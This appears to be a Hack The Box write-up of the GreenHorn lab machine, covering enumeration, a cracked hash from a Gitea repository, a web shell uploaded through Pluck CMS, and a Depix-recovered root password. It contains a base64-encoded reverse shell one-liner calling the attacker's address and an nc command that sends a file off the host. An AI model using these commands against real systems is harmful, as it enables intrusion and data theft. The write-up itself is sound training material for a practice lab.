---
title: HTB - GreenHorn
date: 2024-12-07 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [WebExploitation,LFI,Depix,Pluck CMS]
comments: false
---

The GreenHorn box was compromised by first exploiting a vulnerable Pluck CMS installation via RCE, which was discovered after finding credentials within a Gitea repository. This initial shell then led to a user-level shell using the same password, and finally, pixelated password found in a PDF file was deciphered using Depix, leading to root access

## Common Enumerations

### Nmap

I fired up `nmap` for a full port scan: `sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.25 --open`. As always I throw in the `-sC` for default scripts and `-sV` for version detection. It found the three ports open

- SSH - 22
- HTTP - 80
- TCP - 3000

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.25                                
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-12 19:22 AEST                                                        
Nmap scan report for 10.10.11.25                                                                                        
Host is up (0.0035s latency).                                                                                           
Not shown: 65532 closed tcp ports (conn-refused)                                                                        
PORT     STATE SERVICE VERSION                                                                                          
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                    
| ssh-hostkey:                                                                                                          
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)                                                         
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)                                                       
80/tcp   open  http    nginx 1.18.0 (Ubuntu)                                                                            
|_http-title: Did not follow redirect to http://greenhorn.htb/                                                          
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                             
3000/tcp open  ppp?                                                                                                     
| fingerprint-strings:                                                                                                  
|   GenericLines, Help, RTSPRequest:                                                                                    
|     HTTP/1.1 400 Bad Request                                                                                          
|     Content-Type: text/plain; charset=utf-8                                                                           
|     Connection: close                                                                                                 
|     Request                                                                                                           
|   GetRequest:                                                                                                         
|     HTTP/1.0 200 OK                                                                                                   
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=78b27d98866cc9f0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=0XBu54iseD_VtlDnZEa9P8Wnw7g6MTcyMzQ1NDU0NjIyNzk1NzYwOA; Path=/; Max-Age=86400; HttpOnly; SameSit
e=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 12 Aug 2024 09:22:26 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title> 
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybi
IsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZX
RzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=ec62065c565ae6d5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=kWzi_54gn14APUYRIzhoGl_rFnI6MTcyMzQ1NDU1MTM2NDU0Mjk3NQ; Path=/; Max-Age=86400; HttpOnly; SameSit
e=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 12 Aug 2024 09:22:31 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint 
at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=8/12%Time=66B9D451%P=x86_64-redhat-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,37DB,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=78b27d98866cc9f0;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=0XBu54iseD_VtlDnZEa9P8Wnw7g6MTcyMzQ1NDU0NjIyNzk1NzYwOA;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2012\x20Aug\x202024\x2009:22:26\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
SF:R3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA
SF:6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbm
SF:hvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciL
SF:CJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAv
SF:YX")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0
SF:,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_l
SF:ike_gitea=ec62065c565ae6d5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\n
SF:Set-Cookie:\x20_csrf=kWzi_54gn14APUYRIzhoGl_rFnI6MTcyMzQ1NDU1MTM2NDU0Mj
SF:k3NQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fr
SF:ame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2012\x20Aug\x202024\x2009:
SF:22:31\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.02 seconds 
```

The HTTP port 80 redirected to `greenhorn.htb` so I added that to my `/etc/hosts` file

```bash
10.10.11.25    greenhorn.htb
```

### Website - 80

Heading over to `http://greenhorn.htb/`, the website was pretty basic, nothing too exciting...

![img](/assets/img/GreenHorn/1.webp)

I saw the `?file=` parameter in the URL, my hacker senses started tingling, and thought "LFI!". I tried a few common payloads, but the server was like, "Nah, nice try, buddy!" and gave me "A hacking attempt has been detected. For security reasons, we're blocking any code execution."

![img](/assets/img/GreenHorn/2.webp)

Next up, I spotted a `/login.php` page. It looked like it was running Pluck 4.7.18, which is a content management system (CMS)

![img](/assets/img/GreenHorn/3.webp)

I thought, "Alright, let's go old school and try a brute-force attack." But the login page had other plans and locked me out faster than you can say "SQL injection."

![img](/assets/img/GreenHorn/4.webp)

I decided to do a quick scan with `gobuster` using the command `gobuster dir -u 'http://greenhorn.htb/' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -o recon/gobuster -b 404,302` to see if there were any other interesting directories

```bash
$ gobuster dir -u 'http://greenhorn.htb/' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -o recon/gobuster -b 404,302
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://greenhorn.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404,302
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/08/12 19:46:04 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://greenhorn.htb/images/]
/files                (Status: 301) [Size: 178] [--> http://greenhorn.htb/files/]
/data                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/data/]
/docs                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/docs/]
Progress: 19944 / 20117 (99.14%)
===============================================================
2024/08/12 19:46:47 Finished
===============================================================
```

It found some directories, but nothing that looked juicy. Time to move on from port 80 for now

### Gitea - 3000

Switching gears, I turned my attention to port 3000. It was running `Gitea`, version `1.21.11`, which is basically a self-hosted Git service

![img](/assets/img/GreenHorn/5.webp)

#### Creating Gitea ID

I went ahead and created an account, "z3r0da", After logging in, I found the "GreenAdmin/GreenHorn" repo

![img](/assets/img/GreenHorn/6.webp)

Now we're talking! I started poking around and, after some digging, I found a password hash hiding in `GreenHorn/data/settings/pass.php`

```php
<?php
    $ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

I took the hash and threw it into crackstation and it coughed up the password: `iloveyou1` Jackpot!

![img](/assets/img/GreenHorn/7.webp)

### Logging into pluck

Armed with the password `iloveyou1`, I went back to the Pluck login page, and BOOM, I was in!

![img](/assets/img/GreenHorn/9.webp)

Now, it was time to do some more digging, I remembered that this was Pluck `v4.7.18`, and I found a vulnerability that could lead to Remote Code Execution (RCE) via the `?action=installmodule` parameter

![img](/assets/img/GreenHorn/10.webp)

This is when things started getting really fun. I grabbed `p0wny-shell` from [p0wny-shell here](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php), zipped it up and uploaded it via `http://greenhorn.htb/admin.php?action=installmodule`

![img](/assets/img/GreenHorn/11.webp)

Okay, so p0wny-shell turned out to be a bit unstable, so I decided to set up a good old reverse shell. I used a base64 encoded command as following:

```bash
echo "L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzEzMzcgMD4mMQ==" | base64 -d|bash
```

## Initial Access

### Shell as www-data

I finally had a shell! But it was a basic, non-interactive shell. So, I used Python to upgrade it, with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Now, I had a proper interactive shell. But no user.txt here, darn!

### Shell as junior

So, I decided to try it out for other users with same password `iloveyou1`. It worked! I was now `junior` and I grabbed the user flag

```bash
www-data@greenhorn:/home$ su junior
Password: 
junior@greenhorn:/home$ whoami
junior
junior@greenhorn:/home$ 
```

user.txt

```bash
c5e0f6759...
```

I had a look in the current directory, which showed there was `Using OpenVAS.pdf`

```bash
junior@greenhorn:~$ ls
user.txt  'Using OpenVAS.pdf'
```

I figured there was something worth while in the `Using OpenVAS.pdf` file, so I copied it using nc using the following command

```bash
junior@greenhorn:~$ ls
user.txt  'Using OpenVAS.pdf'
junior@greenhorn:~$ nc 10.10.14.5 1337 < 'Using OpenVAS.pdf'
```

and on my attacking machine I set up a listener:

```bash
$ nc -lvp 1337 > 'Using OpenVAS.pdf'
-rw-r--r--. 1 kad kad 61367 Aug 17 11:36 'Using OpenVAS.pdf'
```

Opening the `Using OpenVAS.pdf` showed there was a pixelated password

![img](/assets/img/GreenHorn/12.webp)

After some research, I came across a tool called [Depix](https://github.com/spipm/Depix) tool, So I cloned the repository and converted the PDF using `$ pdfimages "Using OpenVAS.pdf" OpenVAS` and then executed the following command:

```bash
$ python3 depix.py \
    -p ../OpenVAS-000.ppm \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o ~/Documents/ctf/htb/GreenHorn/www/output.png
```

This resulted in the following

![img](/assets/img/GreenHorn/13.webp)

```text
Password: sidefromsidetheothersidesidefromsidetheotherside
```

## Shell as Root

After I logging in root, I navigated to the `/root` directory, and grabbed that root flag!

```bash
root@greenhorn:/home/junior# id
uid=0(root) gid=0(root) groups=0(root)
root@greenhorn:/home/junior# cd /root
root@greenhorn:~# cat root.txt
bb8d305a761f1e79e38ab31b8419dfc7
root@greenhorn:~# 
```

root.txt

```text
bb8d305a7...
```
